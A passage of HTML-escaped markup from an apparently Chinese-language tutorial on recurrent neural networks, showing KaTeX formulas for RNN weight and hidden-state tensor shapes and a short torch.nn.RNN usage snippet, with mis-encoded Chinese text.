class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-2.4168920000000003em;margin-left:-0.02691em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;h&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.2831079999999999em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt;Â &lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt;Â &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;u&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt;Â &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msubsup&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msubsup&gt;&lt;mtext&gt;Â &lt;/mtext&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;b&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mtext&gt;Â &lt;/mtext&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;h_t^1\space [batch, hidden \space len]&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.064108em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.247em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt;Â &lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt;Â &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msubsup&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;/mrow&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msubsup&gt;&lt;mtext&gt;Â &lt;/mtext&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mtext&gt;Â &lt;/mtext&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mtext&gt;Â &lt;/mtext&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;w_{hh}^1\space[hidden\space len ,hidden\space len]&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.097216em;vertical-align:-0.2831079999999999em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-2.4168920000000003em;margin-left:-0.02691em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;h&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.2831079999999999em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt;Â &lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt;Â &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt;Â &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msubsup&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;/mrow&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/msubsup&gt;&lt;mtext&gt;Â &lt;/mtext&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;b&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mtext&gt;Â &lt;/mtext&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;w_{xh}^2\space [batch, hidden\space len]&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.097216em;vertical-align:-0.2831079999999999em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-2.4168920000000003em;margin-left:-0.02691em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;h&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.2831079999999999em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt;Â &lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt;Â &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msubsup&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;/mrow&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/msubsup&gt;&lt;mtext&gt;Â &lt;/mtext&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mtext&gt;Â &lt;/mtext&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mtext&gt;Â &lt;/mtext&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;w_{hh}^2\space [hidden\space len,hidden\space len]&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.097216em;vertical-align:-0.2831079999999999em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-2.4168920000000003em;margin-left:-0.02691em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;h&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.2831079999999999em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt;Â &lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt;Â &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt;Â &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;ä¸€ä¸ªå¥å­æœ‰å¤šå°‘ä¸ªå•è¯ï¼Œä»£è¡¨RNNè¿›è¡Œå¤šå°‘æ¬¡æ—¶é—´èŠ‚ç‚¹çš„è¿ç®—&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;torchnnrnn&#34;&gt;torch.nn.RNN&lt;/h4&gt;
&lt;p&gt;è€Œåœ¨pytorchä¸­ä½¿ç”¨RNNçš„APIå¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;torch.nn.RNN(input_size, hidden_size, num_layers)

# - input_size è¡¨ç¤ºåµŒå…¥å‘é‡çš„ç»´åº¦ï¼Œä¾‹å¦‚100
# - hidden_size è¡¨ç¤ºéšå±‚çŠ¶æ€å‘é‡çš„ç»´åº¦ï¼Œä¾‹å¦‚20
# - num_layers è¡¨ç¤ºéšå±‚å±‚æ•°/çº¿æ€§å±‚å±‚æ•°
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1657554621837.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;\&lt;/p&gt;
&lt;p&gt;é€šè¿‡æ­¤APIåˆ›å»ºä¸€ä¸ªRNNç½‘ç»œæ¨¡å‹ï¼Œç„¶åæ¨¡å‹çš„è¾“å…¥å’Œåˆšæ‰å›¾ä¸­çš„&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;x_t&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.58056em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.2805559999999999em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;ä¸ä¸€æ ·ï¼Œ&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;x_t&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.58056em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.2805559999999999em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; 